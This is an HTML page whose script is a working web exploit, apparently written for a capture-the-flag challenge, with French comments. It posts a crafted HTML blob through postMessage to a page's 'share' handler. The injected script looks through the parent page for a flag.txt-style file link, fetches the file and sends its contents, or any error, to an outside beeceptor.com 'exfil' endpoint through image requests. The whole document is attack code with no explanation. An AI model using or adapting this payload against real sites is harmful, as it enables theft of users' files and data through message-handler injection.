<html><body><script>
(async () => {
  /* 1. blob html */
  const epic = `
    <script>
      (async () => {
        try {
          const links = [...parent.document.querySelectorAll('a')];
          console.log(links); // DEBUG : afficher tous les liens trouvÃ©s

          const a = [...parent.document.querySelectorAll('a')]
          .find(x => /file-.*\.txt$/.test(x.id || '') || /flag\.txt$/.test(x.href || ''));

          if (!a) {
            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
            return;
          }

          const res = await fetch(a.href);
          const txt = await res.text();

          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(txt);
        } catch (e) {
          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' + encodeURIComponent(e.message);
        }
      })();
    <\/script>`;

  const blob = new Blob([epic], { type: 'text/html' });

  /* 2. postmessage vers la page index */
  window.postMessage({
    type: 'share',
    files: [{ blob, name: 'epic.html', cached: false }]
  }, '*');
})();
</script></body></html>
